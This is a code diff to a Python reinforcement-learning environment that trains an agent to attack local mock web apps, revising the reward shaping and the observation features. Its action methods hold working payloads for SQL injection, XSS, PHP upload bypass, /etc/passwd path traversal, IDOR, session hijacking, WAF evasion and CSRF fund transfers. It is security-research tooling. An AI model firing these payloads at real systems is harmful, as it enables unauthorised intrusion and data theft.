@@ -23,7 +23,14 @@ from urllib3.util.retry import Retry
 from typing import Tuple, Dict, Any
 import time
 import re
+import re
 from agent.payload_manager import PayloadManager
+try:
+    from config import get_config
+    _CONFIG_AVAILABLE = True
+except ImportError:
+    _CONFIG_AVAILABLE = False
+    print("⚠️ Config not found, using defaults")
 
 class WebSecurityGym(gym.Env):
     """
@@ -31,14 +38,91 @@ class WebSecurityGym(gym.Env):
     Think of this as the game engine.
     """
     
-    def __init__(self, target_url: str = "http://localhost:5001", discovered_endpoints: list = None, session=None, mode="standard"):
+    def __init__(self, target_url: str = "http://localhost:5001", discovered_endpoints: list = None, session=None, mode="standard", verbose=False):
         super(WebSecurityGym, self).__init__()
         self.target_url = target_url
+        self.verbose = verbose
         self.discovered_endpoints = discovered_endpoints or []
+        self.port_map = {
+            'ecommerce': 5002,
+            'social': 5003,
+            'banking': 5004,
+            'blog': 5005,
+            'fileshare': 5006
+        }
+        
+        # Load Config
+        if _CONFIG_AVAILABLE:
+            self.config = get_config()
+        else:
+            self.config = None # Fallback handling needed if config missing
+            
         self.mode = mode # 'standard' (150 actions) or 'mock_targets' (Restricted set)
         
         # The Arsenal: Tools the agent can use
         self.payload_manager = PayloadManager()
+        
+        # Action tracking for anti-farming
+        self.action_counts = {}
+
+    def reset(self, seed=None, options=None):
+        """Reset the environment."""
+        super().reset(seed=seed)
+        if seed is not None:
+             self.payload_manager.seed(seed)
+             # Reseed action space if needed
+             self.action_space.seed(seed)
+             
+        # Reset internal state metrics
+        self.current_step_reward = 0.0
+        self.total_reward = 0.0
+        self.steps = 0
+        self.found_vulnerability = 0
+        self.found_sensitive_data = 0
+        self.discovered_vulns = set()
+        self.visited_pages = set()
+        self.history = []
+        self.current_page_id = 0 # Home
+        self.auth_token = None
+        self.csrf_tokens = []
+        
+        # Reset sessions
+        if not hasattr(self, 'session') or self.session is None:
+            self.session = requests.Session()
+            # Basic headers
+            self.session.headers.update({
+                'User-Agent': 'SecurityAgent/1.0',
+                'Accept': 'text/html,application/json'
+            })
+            
+        # Clear cookies
+        self.session.cookies.clear()
+        
+        # Reset Mock Targets if needed (custom reset endpoint)
+        if self.config and self.config.environment.mock_targets:
+             self._reset_mock_targets()
+             
+        # Return initial observation
+        return self._get_observation(), {}
+
+    def _reset_mock_targets(self):
+        """Call reset endpoints on mock targets."""
+        try:
+             # Try to reset the current target app
+             # Determine port from target_url
+             port = 5002 # Default
+             for name, p in self.port_map.items():
+                 if str(p) in self.target_url:
+                     port = p
+                     break
+             
+             try:
+                 requests.post(f"http://localhost:{port}/api/reset", timeout=1)
+             except:
+                 pass
+        except:
+             pass
+
         
         # Define Action Space
         if self.mode == "mock_targets":
@@ -51,7 +135,7 @@ class WebSecurityGym(gym.Env):
             self.action_space = spaces.Discrete(150)
             
         # Observation Space (11 metrics)
-        self.observation_space = spaces.Box(low=0, high=5, shape=(11,), dtype=np.float32)
+        # Observation Space (15 metrics)
         # - XSS: 6 instances (stored/reflected variations)
         # - SQL Injection: 3 instances (login/search patterns)
         # - File Upload/Traverse: 4 instances (upload + path traversal)
@@ -60,7 +144,6 @@ class WebSecurityGym(gym.Env):
         # - Weak Auth: 3 instances (password, session, reset token)
         # - Mass Assignment: 1 instance (registration bypass)
         # - Info Disclosure: 1 instance (admin endpoint)
-        self.action_space = spaces.Discrete(150)
         
         # Observations: The agent sees 10 features about the current page
         # 1. Current Page ID
@@ -74,9 +157,14 @@ class WebSecurityGym(gym.Env):
         # 9. Content Variance (Did the page change unexpectedly?)
         # 10. Input Count (How many forms/inputs are there?)
         # 11. Business Context (Is this a money/admin page?)
-        self.observation_space = spaces.Box(low=0, high=5, shape=(11,), dtype=np.float32)
+        # 12. Steps Remaining (Normalized 0-1)
+        # 13. Phase ID (Normalized 0-1)
+        # 15. Coverage Ratio (Visited / Total Known)
+        # Fix: Increased high bound to accommodate all values (page_id can exceed 5, status_val can be 6)
+        self.observation_space = spaces.Box(low=0, high=10, shape=(15,), dtype=np.float32)
         
         # Setup the "Browser" (HTTP Session)
+        self.timeout = 3 # Default timeout for actions (seconds)
         self._setup_browser_session(session)
         
         # Game State Variables
@@ -91,7 +179,7 @@ class WebSecurityGym(gym.Env):
         self.last_response_time: float = 0.0
         self.content_variance: float = 0.0
         self.input_count: int = 0
-        self.baseline_page_size: int = 0
+        self.baseline_page_sizes: Dict[int, int] = {} # Fix: Track baseline per page
         
         # PENTESTER MODE: Longer episodes for full exploration
         self.max_steps_per_episode: int = 100
@@ -414,6 +502,9 @@ class WebSecurityGym(gym.Env):
         self.phase_progress = {0: 0, 1: 0, 2: 0, 3: 0}
         self.phase_unlocked = {0: True, 1: False, 2: False, 3: False}
         
+        # Reset anti-farming counters
+        self.action_counts = {}
+        
         return self._get_observation(), {}
     
     def _validate_phase_action(self, action_id: int) -> Tuple[bool, float]:
@@ -444,14 +535,14 @@ class WebSecurityGym(gym.Env):
         # Bonus for correct phase sequencing
         bonus = 0.0
         if action_phase == self.current_phase:
-            bonus = 10.0  # Reward for staying in current phase
+            bonus = 0.1  # Fix: Reduced from 10.0 to prevent phase farming
             self.phase_progress[action_phase] += 1
             
             # Unlock next phase after sufficient progress
             if self.phase_progress[action_phase] >= 5 and action_phase < 3:
                 self.phase_unlocked[action_phase + 1] = True
                 self.current_phase = action_phase + 1
-                bonus += 20.0  # Big bonus for phase completion!
+                bonus += 0.2  # Fix: Reduced from 20.0 (Completion Bonus)
         
         return True, bonus
     
@@ -461,7 +552,7 @@ class WebSecurityGym(gym.Env):
         Returns: (New State, Reward, Game Over?, Truncated?, Info)
         """
         self.steps_taken += 1
-        reward = -1.0  # Small penalty for each step (encourages speed)
+        reward = -0.01  # Small penalty for each step (encourages speed)
         game_over = False
         truncated = False
         info = {}
@@ -476,17 +567,21 @@ class WebSecurityGym(gym.Env):
         
         try:
             # 1. Perform the Action
-            action_function = self.action_book.get(action_id)
+            real_action_id = action_id
+            if self.mode == "mock_targets":
+                real_action_id = self.mock_action_map.get(action_id, 0)
+            
+            action_function = self.action_book.get(real_action_id)
+            
             if action_function:
                 action_name = action_function.__name__
                 
+                # Update action counts for anti-farming
+                self.action_counts[real_action_id] = self.action_counts.get(real_action_id, 0) + 1
+                
                 # EFFICIENT ALGORITHM: Phase-Based Reward Shaping
-                # Modify action_id for restricted space
-                real_action_id = action_id
-                if self.mode == "mock_targets":
-                    real_action_id = self.mock_action_map.get(action_id, 0)
-                    action_function = self.action_book.get(real_action_id)
-                    action_name = action_function.__name__ if action_function else "Unknown"
+                # (real_action_id is already set)
+
                 
                 is_valid, phase_bonus = self._validate_phase_action(real_action_id)
                 reward += phase_bonus
@@ -509,6 +604,18 @@ class WebSecurityGym(gym.Env):
                             response, action_reward = None, 0.0
                     else:
                         response, action_reward = res
+                        
+                    # ANTI-FARMING: Diminishing returns for repeated actions
+                    # Exception: If we found a NEW vulnerability (reward >= 1.0), don't diminish
+                    if action_reward < 1.0:
+                        count = self.action_counts.get(real_action_id, 0)
+                        if count > 5:
+                            action_reward *= 0.5  # 50% penalty for >5 repeats
+                        if count > 10:
+                            action_reward *= 0.1  # 90% penalty for >10 repeats
+                        if count > 20:
+                            action_reward = 0.0  # No points for spamming
+                            
                 except Exception as e:
                     print(f"❌ CRITICAL ERROR in Action {action_name}: {e}")
                     # import traceback
@@ -542,7 +649,10 @@ class WebSecurityGym(gym.Env):
                     else:
                         info['payload'] = ""
                 
-                print(f"Action: {action_name:<25} | {method:<4} | Status: {status:<3} | Reward: {action_reward:>5.1f} | URL: {url} {payload_info}", flush=True)
+                        info['payload'] = ""
+                
+                if self.verbose:
+                    print(f"Action: {action_name:<25} | {method:<4} | Status: {status:<3} | Reward: {action_reward:>5.1f} | URL: {url} {payload_info}", flush=True)
             else:
                 response = None
                 
@@ -565,29 +675,7 @@ class WebSecurityGym(gym.Env):
         status_code = response.status_code if response else 500
         return self._get_observation(status_code), reward, game_over, truncated, info
     
-    def _analyze_response_content(self, response):
-        """Looks at the page content to update our 'senses'."""
-        content_len = len(response.text)
-        
-        # Establish baseline size for this page if new
-        if self.baseline_page_size == 0:
-            self.baseline_page_size = content_len
-        
-        # Calculate how much the page changed (Variance)
-        # High variance might mean we broke something or revealed hidden data
-        diff = abs(content_len - self.baseline_page_size)
-        self.content_variance = min(diff / (self.baseline_page_size + 1) * 5, 5.0)
-        
-        # Update baseline (moving average)
-        self.baseline_page_size = int(0.9 * self.baseline_page_size + 0.1 * content_len)
-        
-        # Count inputs (Attack Surface)
-        self.input_count = response.text.count('<input') + response.text.count('name=')
-        
-        # BUSINESS LOGIC AWARENESS
-        # Detects if the page deals with money, quantities, or roles
-        keywords = ['price', 'balance', 'amount', 'quantity', 'total', 'cart', 'admin', 'role']
-        self.business_context = 1 if any(k in response.text.lower() for k in keywords) else 0
+
 
     def _get_observation(self, status_code: int = 200) -> np.ndarray:
         """
@@ -603,6 +691,12 @@ class WebSecurityGym(gym.Env):
         # Normalize values to be small numbers (0-5) for the Neural Network
         time_norm = min(self.last_response_time, 5.0)
         inputs_norm = min(self.input_count, 5.0)
+
+        # State Enrichment (Markovian Fix)
+        steps_remaining_norm = (self.max_steps_per_episode - self.steps_taken) / self.max_steps_per_episode
+        phase_norm = self.current_phase / 3.0
+        vulns_norm = min(len(self.discovered_vulns) / 10.0, 1.0)
+        coverage_norm = min(len(self.visited_pages) / max(len(self.discovered_endpoints), 1), 1.0)
         
         return np.array([
             self.current_page_id,
@@ -615,7 +709,11 @@ class WebSecurityGym(gym.Env):
             time_norm,
             self.content_variance,
             inputs_norm,
-            self.business_context # New Feature (11th dimension)
+            self.business_context,
+            steps_remaining_norm,  # 12
+            phase_norm,            # 13
+            vulns_norm,            # 14
+            coverage_norm          # 15
         ], dtype=np.float32)
     
     # --- ACTIONS: NAVIGATION ---
@@ -639,25 +737,28 @@ class WebSecurityGym(gym.Env):
         """Navigate to shopping cart (E-commerce specific)."""
         try:
             response = self.session.get(f"{self.target_url}/cart", timeout=self.timeout)
-            self._update_state_from_response(response, "cart_navigation")
+            reward = self._update_state_from_response(response, "cart_navigation")
+            return response, reward
         except:
-            self._update_state_error()
+            return self._update_state_error()
 
     def navigate_messages(self):
         """Navigate to messages (Social media specific)."""
         try:
             response = self.session.get(f"{self.target_url}/messages/1", timeout=self.timeout)
-            self._update_state_from_response(response, "messages_navigation")
+            reward = self._update_state_from_response(response, "messages_navigation")
+            return response, reward
         except:
-            self._update_state_error()
+            return self._update_state_error()
 
     def navigate_dashboard(self):
         """Navigate to user dashboard."""
         try:
             response = self.session.get(f"{self.target_url}/dashboard", timeout=self.timeout)
-            self._update_state_from_response(response, "dashboard_navigation")
+            reward = self._update_state_from_response(response, "dashboard_navigation")
+            return response, reward
         except:
-            self._update_state_error()
+            return self._update_state_error()
 
     def check_admin_endpoints(self):
         """Check for admin-specific endpoints."""
@@ -666,11 +767,11 @@ class WebSecurityGym(gym.Env):
             try:
                 response = self.session.get(f"{self.target_url}{path}", timeout=self.timeout)
                 if response.status_code != 404:
-                    self._update_state_from_response(response, "admin_endpoint_found")
-                    return
+                    reward = self._update_state_from_response(response, "admin_endpoint_found")
+                    return response, reward
             except:
                 continue
-        self._update_state_error()
+        return self._update_state_error()
 
     def check_user_endpoints(self):
         """Check for user-specific endpoints."""
@@ -679,11 +780,11 @@ class WebSecurityGym(gym.Env):
             try:
                 response = self.session.get(f"{self.target_url}{path}", timeout=self.timeout)
                 if response.status_code != 404:
-                    self._update_state_from_response(response, "user_endpoint_found")
-                    return
+                    reward = self._update_state_from_response(response, "user_endpoint_found")
+                    return response, reward
             except:
                 continue
-        self._update_state_error()
+        return self._update_state_error()
 
     def check_file_endpoints(self):
         """Check for file upload/download endpoints."""
@@ -692,11 +793,11 @@ class WebSecurityGym(gym.Env):
             try:
                 response = self.session.get(f"{self.target_url}{path}", timeout=self.timeout)
                 if response.status_code != 404:
-                    self._update_state_from_response(response, "file_endpoint_found")
-                    return
+                    reward = self._update_state_from_response(response, "file_endpoint_found")
+                    return response, reward
             except:
                 continue
-        self._update_state_error()
+        return self._update_state_error()
 
     def check_payment_endpoints(self):
         """Check for payment-related endpoints."""
@@ -705,11 +806,11 @@ class WebSecurityGym(gym.Env):
             try:
                 response = self.session.get(f"{self.target_url}{path}", timeout=self.timeout)
                 if response.status_code != 404:
-                    self._update_state_from_response(response, "payment_endpoint_found")
-                    return
+                    reward = self._update_state_from_response(response, "payment_endpoint_found")
+                    return response, reward
             except:
                 continue
-        self._update_state_error()
+        return self._update_state_error()
 
     def probe_endpoints(self):
         """General endpoint probing."""
@@ -725,11 +826,11 @@ class WebSecurityGym(gym.Env):
             for endpoint in endpoints:
                 response = self.session.get(f"{self.target_url}{endpoint}", timeout=self.timeout)
                 if response.status_code in [200, 401, 403]:
-                    self._update_state_from_response(response, "endpoint_probe_success")
-                    return
+                    reward = self._update_state_from_response(response, "endpoint_probe_success")
+                    return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     def enumerate_parameters(self):
         """Enumerate URL parameters and form inputs."""
@@ -743,11 +844,11 @@ class WebSecurityGym(gym.Env):
             for url in test_urls:
                 response = self.session.get(url, timeout=self.timeout)
                 if response.status_code != 404:
-                    self._update_state_from_response(response, "parameter_discovery")
-                    return
+                    reward = self._update_state_from_response(response, "parameter_discovery")
+                    return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     def test_weak_passwords(self):
         """Test common weak passwords."""
@@ -759,11 +860,11 @@ class WebSecurityGym(gym.Env):
                     "password": password
                 }, timeout=self.timeout)
                 if response.status_code == 200:
-                    self._update_state_from_response(response, "weak_password_success")
-                    return
+                    reward = self._update_state_from_response(response, "weak_password_success")
+                    return response, reward
             except:
                 continue
-        self._update_state_error()
+        return self._update_state_error()
 
     def test_session_fixation(self):
         """Test for session fixation vulnerabilities."""
@@ -780,11 +881,11 @@ class WebSecurityGym(gym.Env):
 
             session_after = self.session.cookies.get('session')
             if session_before == session_after and session_before:
-                self._update_state_from_response(response, "session_fixation_vulnerable")
-                return
+                reward = self._update_state_from_response(response, "session_fixation_vulnerable")
+                return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     def test_password_reset(self):
         """Test password reset functionality."""
@@ -793,11 +894,11 @@ class WebSecurityGym(gym.Env):
                 "email": "test@example.com"
             }, timeout=self.timeout)
             if response.status_code == 200:
-                self._update_state_from_response(response, "password_reset_functional")
-                return
+                reward = self._update_state_from_response(response, "password_reset_functional")
+                return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     def test_login_bypass(self):
         """Test various login bypass techniques."""
@@ -811,11 +912,11 @@ class WebSecurityGym(gym.Env):
                 response = self.session.post(f"{self.target_url}/api/login",
                                            json=attempt, timeout=self.timeout)
                 if response.status_code == 200:
-                    self._update_state_from_response(response, "login_bypass_success")
-                    return
+                    reward = self._update_state_from_response(response, "login_bypass_success")
+                    return response, reward
             except:
                 continue
-        self._update_state_error()
+        return self._update_state_error()
 
     def test_registration_bypass(self):
         """Test registration with mass assignment."""
@@ -828,33 +929,33 @@ class WebSecurityGym(gym.Env):
                 "balance": 999999  # Mass assignment attempt
             }, timeout=self.timeout)
             if response.status_code == 200:
-                self._update_state_from_response(response, "mass_assignment_success")
-                return
+                reward = self._update_state_from_response(response, "mass_assignment_success")
+                return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     def check_authentication_state(self):
         """Verify auth state handling."""
         try:
             response = self.session.get(f"{self.target_url}/api/me", timeout=self.timeout)
             if response.status_code == 200:
-                self._update_state_from_response(response, "auth_state_verified")
-                return
+                reward = self._update_state_from_response(response, "auth_state_verified")
+                return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     def test_logout_functionality(self):
         """Test logout behavior."""
         try:
             response = self.session.post(f"{self.target_url}/logout", timeout=self.timeout)
             if response.status_code in [200, 302]:
-                self._update_state_from_response(response, "logout_functional")
-                return
+                reward = self._update_state_from_response(response, "logout_functional")
+                return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     def check_session_timeout(self):
         """Session timeout testing."""
@@ -862,11 +963,11 @@ class WebSecurityGym(gym.Env):
             # Check if session persists (simple test)
             response = self.session.get(f"{self.target_url}/dashboard", timeout=self.timeout)
             if response.status_code == 200:
-                self._update_state_from_response(response, "session_active")
-                return
+                reward = self._update_state_from_response(response, "session_active")
+                return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     def test_remember_me(self):
         """Remember me functionality."""
@@ -877,11 +978,11 @@ class WebSecurityGym(gym.Env):
                 "remember_me": True
             }, timeout=self.timeout)
             if response.status_code == 200:
-                self._update_state_from_response(response, "remember_me_functional")
-                return
+                reward = self._update_state_from_response(response, "remember_me_functional")
+                return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     def test_account_lockout(self):
         """Account lockout testing."""
@@ -900,11 +1001,11 @@ class WebSecurityGym(gym.Env):
             }, timeout=self.timeout)
 
             if response.status_code == 429:  # Too many requests / locked
-                self._update_state_from_response(response, "account_lockout_active")
-                return
+                reward = self._update_state_from_response(response, "account_lockout_active")
+                return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     # PHASE 2: IDOR ATTACKS (30-59)
 
@@ -913,44 +1014,44 @@ class WebSecurityGym(gym.Env):
         try:
             response = self.session.get(f"{self.target_url}/api/profile/2", timeout=self.timeout)
             if response.status_code == 200 and "user" in response.text.lower():
-                self._update_state_from_response(response, "idor_profile_view_success")
-                return
+                reward = self._update_state_from_response(response, "idor_profile_view_success")
+                return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     def attack_idor_posts_view(self):
         """IDOR: View other user posts."""
         try:
             response = self.session.get(f"{self.target_url}/api/posts?user_id=2", timeout=self.timeout)
             if response.status_code == 200:
-                self._update_state_from_response(response, "idor_posts_view_success")
-                return
+                reward = self._update_state_from_response(response, "idor_posts_view_success")
+                return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     def attack_idor_orders_view(self):
         """IDOR: View other user orders."""
         try:
             response = self.session.get(f"{self.target_url}/api/orders/2", timeout=self.timeout)
             if response.status_code == 200:
-                self._update_state_from_response(response, "idor_orders_view_success")
-                return
+                reward = self._update_state_from_response(response, "idor_orders_view_success")
+                return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     def attack_idor_file_download(self):
         """IDOR: Download any user's files."""
         try:
             response = self.session.get(f"{self.target_url}/api/download/1", timeout=self.timeout)
             if response.status_code == 200:
-                self._update_state_from_response(response, "idor_file_download_success")
-                return
+                reward = self._update_state_from_response(response, "idor_file_download_success")
+                return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     # PHASE 3: EXPLOITATION ATTACKS (60-89)
 
@@ -964,11 +1065,11 @@ class WebSecurityGym(gym.Env):
                     "password": "anything"
                 }, timeout=self.timeout)
                 if response.status_code == 200:
-                    self._update_state_from_response(response, "sqli_login_success")
-                    return
+                    reward = self._update_state_from_response(response, "sqli_login_success")
+                    return response, reward
             except:
                 continue
-        self._update_state_error()
+        return self._update_state_error()
 
     def attack_sqli_search_injection(self):
         """SQL Injection: Search box injection."""
@@ -976,11 +1077,11 @@ class WebSecurityGym(gym.Env):
             response = self.session.get(f"{self.target_url}/api/products?search=' UNION SELECT username,password FROM users --",
                                       timeout=self.timeout)
             if response.status_code == 200 and len(response.text) > 100:
-                self._update_state_from_response(response, "sqli_search_success")
-                return
+                reward = self._update_state_from_response(response, "sqli_search_success")
+                return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     def attack_xss_stored_posts(self):
         """XSS: Stored in posts."""
@@ -990,11 +1091,11 @@ class WebSecurityGym(gym.Env):
                 "title": "Test Post"
             }, timeout=self.timeout)
             if response.status_code == 200:
-                self._update_state_from_response(response, "xss_stored_posts_success")
-                return
+                reward = self._update_state_from_response(response, "xss_stored_posts_success")
+                return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     def attack_xss_stored_comments(self):
         """XSS: Stored in comments."""
@@ -1003,11 +1104,11 @@ class WebSecurityGym(gym.Env):
                 "content": "<script>alert('XSS')</script>"
             }, timeout=self.timeout)
             if response.status_code == 200:
-                self._update_state_from_response(response, "xss_stored_comments_success")
-                return
+                reward = self._update_state_from_response(response, "xss_stored_comments_success")
+                return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     def attack_file_upload_bypass(self):
         """File Upload: Extension bypass."""
@@ -1015,11 +1116,11 @@ class WebSecurityGym(gym.Env):
             files = {'file': ('shell.php.jpg', '<?php phpinfo(); ?>', 'image/jpeg')}
             response = self.session.post(f"{self.target_url}/upload", files=files, timeout=self.timeout)
             if response.status_code == 200:
-                self._update_state_from_response(response, "file_upload_bypass_success")
-                return
+                reward = self._update_state_from_response(response, "file_upload_bypass_success")
+                return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     def attack_path_traversal_basic(self):
         """Path Traversal: Basic directory traversal."""
@@ -1027,11 +1128,11 @@ class WebSecurityGym(gym.Env):
             response = self.session.get(f"{self.target_url}/download/1?filepath=../../../etc/passwd",
                                       timeout=self.timeout)
             if response.status_code == 200 and "root:" in response.text:
-                self._update_state_from_response(response, "path_traversal_success")
-                return
+                reward = self._update_state_from_response(response, "path_traversal_success")
+                return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     # PHASE 4: BUSINESS LOGIC ATTACKS (90-99)
 
@@ -1043,11 +1144,11 @@ class WebSecurityGym(gym.Env):
                 "quantity": -10
             }, timeout=self.timeout)
             if response.status_code == 200:
-                self._update_state_from_response(response, "negative_quantity_success")
-                return
+                reward = self._update_state_from_response(response, "negative_quantity_success")
+                return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     def attack_price_manipulation(self):
         """Business Logic: Price manipulation in checkout."""
@@ -1057,11 +1158,11 @@ class WebSecurityGym(gym.Env):
                 "total": 0.01
             }, timeout=self.timeout)
             if response.status_code == 200:
-                self._update_state_from_response(response, "price_manipulation_success")
-                return
+                reward = self._update_state_from_response(response, "price_manipulation_success")
+                return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     def attack_payment_bypass(self):
         """Business Logic: Payment bypass."""
@@ -1070,22 +1171,22 @@ class WebSecurityGym(gym.Env):
                 "amount": -100
             }, timeout=self.timeout)
             if response.status_code == 200:
-                self._update_state_from_response(response, "payment_bypass_success")
-                return
+                reward = self._update_state_from_response(response, "payment_bypass_success")
+                return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     def attack_info_disclosure_admin(self):
         """Information Disclosure: Admin stats."""
         try:
             response = self.session.get(f"{self.target_url}/api/admin/stats", timeout=self.timeout)
             if response.status_code == 200 and ("secret" in response.text.lower() or "key" in response.text.lower()):
-                self._update_state_from_response(response, "info_disclosure_success")
-                return
+                reward = self._update_state_from_response(response, "info_disclosure_success")
+                return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     # ============================================================================
     # ADVANCED REAL-WORLD ATTACK IMPLEMENTATIONS
@@ -1114,11 +1215,11 @@ class WebSecurityGym(gym.Env):
 
             response = self.session.get(f"{self.target_url}/api/admin/users", headers=headers, timeout=self.timeout)
             if response.status_code == 200:
-                self._update_state_from_response(response, "jwt_algorithm_confusion_success")
-                return
+                reward = self._update_state_from_response(response, "jwt_algorithm_confusion_success")
+                return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     def attack_mfa_bypass(self):
         """Multi-Factor Authentication Bypass."""
@@ -1132,11 +1233,11 @@ class WebSecurityGym(gym.Env):
             for attempt in bypass_attempts:
                 response = self.session.post(f"{self.target_url}/api/auth/mfa", json=attempt, timeout=self.timeout)
                 if response.status_code == 200:
-                    self._update_state_from_response(response, "mfa_bypass_success")
-                    return
+                    reward = self._update_state_from_response(response, "mfa_bypass_success")
+                    return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     def attack_session_hijacking(self):
         """Session Token Manipulation."""
@@ -1145,12 +1246,12 @@ class WebSecurityGym(gym.Env):
             self.session.cookies.set('session', 'admin_session_token')
             response = self.session.get(f"{self.target_url}/api/admin/users", timeout=self.timeout)
             if response.status_code == 200:
-                self._update_state_from_response(response, "session_hijacking_success")
-                return
+                reward = self._update_state_from_response(response, "session_hijacking_success")
+                return response, reward
             self.session.cookies = original_cookies
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     # WAF BYPASS TECHNIQUES (110-124)
 
@@ -1160,11 +1261,11 @@ class WebSecurityGym(gym.Env):
             encoded_payload = "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
             response = self.session.get(f"{self.target_url}/search?q={encoded_payload}", timeout=self.timeout)
             if "<script>" in response.text and response.status_code != 403:
-                self._update_state_from_response(response, "waf_encoding_bypass_success")
-                return
+                reward = self._update_state_from_response(response, "waf_encoding_bypass_success")
+                return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     def attack_waf_unicode_bypass(self):
         """WAF Bypass: Unicode Characters."""
@@ -1172,11 +1273,11 @@ class WebSecurityGym(gym.Env):
             unicode_payload = "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"
             response = self.session.get(f"{self.target_url}/search?q={unicode_payload}", timeout=self.timeout)
             if response.status_code != 403:
-                self._update_state_from_response(response, "waf_unicode_bypass_success")
-                return
+                reward = self._update_state_from_response(response, "waf_unicode_bypass_success")
+                return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     def attack_waf_timing_attack(self):
         """WAF Bypass: Timing Attack."""
@@ -1186,11 +1287,11 @@ class WebSecurityGym(gym.Env):
             response = self.session.get(f"{self.target_url}/api/products?search=' UNION SELECT * FROM users --",
                                       timeout=self.timeout)
             if response.status_code == 200 and "users" in response.text.lower():
-                self._update_state_from_response(response, "waf_timing_bypass_success")
-                return
+                reward = self._update_state_from_response(response, "waf_timing_bypass_success")
+                return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     def attack_waf_parameter_pollution(self):
         """WAF Bypass: Parameter Pollution."""
@@ -1198,11 +1299,11 @@ class WebSecurityGym(gym.Env):
             url = f"{self.target_url}/search?q=normal&q=<script>alert(1)</script>"
             response = self.session.get(url, timeout=self.timeout)
             if "<script>" in response.text and response.status_code != 403:
-                self._update_state_from_response(response, "waf_parameter_pollution_success")
-                return
+                reward = self._update_state_from_response(response, "waf_parameter_pollution_success")
+                return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     # ADVANCED CSRF PROTECTION BYPASS (125-132)
 
@@ -1224,11 +1325,11 @@ class WebSecurityGym(gym.Env):
                         token = match.group(1)
                         self.csrf_tokens = getattr(self, 'csrf_tokens', [])
                         self.csrf_tokens.append(token)
-                        self._update_state_from_response(response, "csrf_token_extraction_success")
-                        return
+                        reward = self._update_state_from_response(response, "csrf_token_extraction_success")
+                        return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     def attack_csrf_token_reuse(self):
         """CSRF: Reuse captured tokens."""
@@ -1243,11 +1344,11 @@ class WebSecurityGym(gym.Env):
                 }
                 response = self.session.post(f"{self.target_url}/transfer", data=data, timeout=self.timeout)
                 if response.status_code == 200:
-                    self._update_state_from_response(response, "csrf_token_reuse_success")
-                    return
+                    reward = self._update_state_from_response(response, "csrf_token_reuse_success")
+                    return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     def attack_csrf_samesite_bypass(self):
         """CSRF: SameSite cookie bypass."""
@@ -1259,27 +1360,15 @@ class WebSecurityGym(gym.Env):
             data = "amount=100&to_account=attacker"
             response = self.session.post(f"{self.target_url}/transfer", data=data, headers=headers, timeout=self.timeout)
             if response.status_code == 200:
-                self._update_state_from_response(response, "csrf_samesite_bypass_success")
-                return
+                reward = self._update_state_from_response(response, "csrf_samesite_bypass_success")
+                return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     # MODERN SECURITY CONTROL BYPASS (133-144)
 
-    def attack_cors_misconfiguration(self):
-        """CORS Misconfiguration Exploitation."""
-        try:
-            headers = {"Origin": "https://evil.com"}
-            response = self.session.options(f"{self.target_url}/api/users", headers=headers, timeout=self.timeout)
 
-            if ("access-control-allow-origin" in response.headers and
-                "*" in response.headers["access-control-allow-origin"]):
-                self._update_state_from_response(response, "cors_misconfiguration_success")
-                return
-        except:
-            pass
-        self._update_state_error()
 
     def attack_security_headers_bypass(self):
         """Security Headers Bypass."""
@@ -1295,43 +1384,15 @@ class WebSecurityGym(gym.Env):
 
             for header, bad_values in weak_headers.items():
                 if header not in response.headers or (bad_values and response.headers[header] in bad_values):
-                    self._update_state_from_response(response, "security_headers_bypass_success")
-                    return
+                    reward = self._update_state_from_response(response, "security_headers_bypass_success")
+                    return response, reward
         except:
             pass
-        self._update_state_error()
+        return self._update_state_error()
 
     # ADVANCED EXPLOITATION TECHNIQUES (145-149)
 
-    def attack_graphql_introspection(self):
-        """GraphQL Schema Introspection."""
-        try:
-            introspection_query = '''
-            query Introspect {
-                __schema {
-                    types {
-                        name
-                        fields {
-                            name
-                            type {
-                                name
-                            }
-                        }
-                    }
-                }
-            }
-            '''
 
-            response = self.session.post(f"{self.target_url}/graphql", json={
-                "query": introspection_query
-            }, timeout=self.timeout)
-
-            if response.status_code == 200 and "__schema" in response.text:
-                self._update_state_from_response(response, "graphql_introspection_success")
-                return
-        except:
-            pass
-        self._update_state_error()
 
     # ============================================================================
